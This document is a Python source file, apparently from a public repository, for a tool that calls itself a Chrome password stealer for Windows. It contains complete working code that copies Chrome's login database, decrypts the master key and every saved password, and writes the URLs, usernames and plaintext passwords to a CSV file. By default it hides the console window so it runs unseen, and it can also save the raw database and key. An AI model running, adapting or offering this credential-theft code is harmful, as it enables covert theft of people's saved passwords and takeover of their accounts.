#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This module steals chrome passwords on Windows.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This module steals chrome passwords on Windows.

~# python3 ChromePasswordsStealer.py --save-all --window -f passwords
~# python3 ChromePasswordsStealer.py

>>> from ChromePasswordsStealer import ChromePasswordsStealer
>>> stealer = ChromePasswordsStealer()
>>> stealer = ChromePasswordsStealer("passwords", True)
>>> stealer.get_database_cursor()
>>> stealer.get_key()
>>> for url, username, password in stealer.get_credentials(): print(url, username, password)
...
>>> stealer.save_and_clean()
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = "This module steals chrome passwords on Windows."
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ChromePasswordsStealer"

copyright = """
ChromePasswordsStealer  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["ChromePasswordsStealer", "main"]

print(copyright)

from tempfile import TemporaryFile, _get_default_tempdir
from argparse import ArgumentParser, Namespace
from win32crypt import CryptUnprotectData
from win32console import GetConsoleWindow
from PythonToolsKit.PrintF import printf
from os.path import join, exists, isfile
from shutil import copyfile, copyfileobj
from base64 import b64decode, b16encode
from collections.abc import Iterator
from win32gui import ShowWindow
from typing import Tuple, List
from os import environ, remove
from Crypto.Cipher import AES
from functools import partial
from sqlite3 import connect
from getpass import getuser
from sys import argv, exit
from platform import node
from time import strftime
from io import BytesIO
from csv import writer
from json import load


class ChromePasswordsStealer:

    """
    This class steals chrome passwords on Windows.
    """

    def __init__(self, filename: str = None, save_all: bool = False):
        user_data = self.user_data = join(
            environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
        )
        self.key_file = join(
            user_data,
            "Local State",
        )
        self.db_path = join(
            user_data,
            "Default",
            "Login Data",
        )

        self.requete = (
            "SELECT origin_url, username_value, password_value FROM logins"
        )
        self.tempdb = join(_get_default_tempdir(), "chrome.db")
        tempfile = self.tempfile = TemporaryFile(mode="w+", newline='')
        self.tempcsv = writer(tempfile)
        self.save_all = save_all

        self.time = strftime("%Y_%m_%d_%H_%M_%S")
        self.computer_name = node()
        self.user_name = getuser()
        self.filename = self.get_filename(
            filename or "chrome_passwords", "csv"
        )

    def get_filename(self, filename: str, extension: str) -> str:

        """
        This function returns a filename to save file.
        """

        return (
            f"{filename}_{self.computer_name}_"
            f"{self.user_name}_{self.time}.{extension}"
        )

    def get_database_cursor(self) -> None:

        """
        This function copies and connects to the Chrome password database.
        """

        tempdb = self.tempdb
        copyfile(self.db_path, tempdb)
        connection = self.connection = connect(tempdb)
        self.cursor = connection.cursor()

    def get_key(self) -> bytes:

        """
        This function returns the encryption key.
        """

        key_filename = self.key_file

        if not exists(key_filename) or not isfile(key_filename):
            self.key = None
            return None

        with open(self.key_file, "rb") as key_file:
            data = load(key_file)

        try:
            key = self.key = CryptUnprotectData(
                b64decode(data.get("os_crypt", {}).get("encrypted_key", ""))[
                    5:
                ],
                None,
                None,
                None,
                0,
            )[1]
        except Exception:
            self.key = None
            return None

        return key

    def decrypt_password(self, password: bytes) -> str:

        """
        This function decrypts chrome password.
        """

        password_buffer = BytesIO(password)
        reader = password_buffer.read

        if reader(3) == b"v10":
            key = self.key
            iv = reader(12)
            secrets = reader()

            if key is None:
                return ""

            decryptor = AES.new(self.key, AES.MODE_GCM, iv)
            return decryptor.decrypt(secrets)[:-16].decode("latin-1")
        else:
            return CryptUnprotectData(password, None, None, None, 0)[1].decode(
                "latin-1"
            )

    def get_credentials(self) -> Iterator[Tuple[str, str, str]]:

        """
        This function get credentials from the database cursor.
        """

        writerow = self.tempcsv.writerow
        decrypt_password = self.decrypt_password

        writerow(("URL", "Username", "Password"))

        for (
            url,
            user,
            password,
        ) in self.cursor.execute(self.requete):
            password = decrypt_password(password)
            credentials = (url, user, password)
            writerow(credentials)
            yield credentials

    def save_and_clean(self) -> None:

        """
        This function copies and removes temp files and closes connection.
        """

        get_filename = self.get_filename
        tempfile = self.tempfile
        tempdb = self.tempdb

        tempfile.seek(0)
        with open(self.filename, "w") as file:
            copyfileobj(tempfile, file)

        tempfile.close()

        self.cursor.close()
        self.connection.close()

        if self.save_all:
            copyfile(tempdb, get_filename("chromedb", "db"))
            copyfile(self.key_file, get_filename("keyfile", "json"))
            with open(get_filename("keyfile", "bin"), "wb") as keyfile:
                keyfile.write(self.key or b"")

        remove(tempdb)


def parse_args() -> Namespace:

    """
    This function parse arguments.
    """

    parser = ArgumentParser(
        description="This program steals Chrome passwords on Windows."
    )
    add_argument = parser.add_argument

    add_argument(
        "--filename",
        "-f",
        help="The filename to export the credentials.",
    )
    add_argument(
        "--window", "-w", help="Do not hide the console.", action="store_true"
    )
    add_argument(
        "--save-all",
        "-s",
        help="Save chrome db, key file and key.",
        action="store_true",
    )

    return parser.parse_args()


def main(argv: List[str] = argv[1:]) -> int:

    """
    This function starts the ChromePasswordStealer
    from the command line.
    """

    global printf

    arguments = parse_args()

    if not arguments.window:
        printf = lambda *x: None
        ShowWindow(GetConsoleWindow(), 0)
    else:
        printf = partial(printf, end="\n")

    printf("Arguments parsed, mode console.", "INFO")
    stealer = ChromePasswordsStealer(arguments.filename, arguments.save_all)

    printf(f"Stealer created, save filename: {stealer.filename!r}")
    printf(
        f"Get DB path: {stealer.db_path!r}, Key file path: {stealer.key_file!r}",
        "INFO",
    )

    stealer.get_database_cursor()
    printf("DB connection done.")

    key = b16encode(stealer.get_key() or b"").decode("latin-1")
    printf(f"Get encryption key: {key!r}")

    for url, username, password in stealer.get_credentials():
        printf(f"Get credentials for {url!r}: {username!r} {password!r}")

    stealer.save_and_clean()
    printf("Temp files are cleaned, credentials are saved.", "INFO")

    if not arguments.window:
        ShowWindow(GetConsoleWindow(), 1)

    return 0


if __name__ == "__main__":
    exit(main())
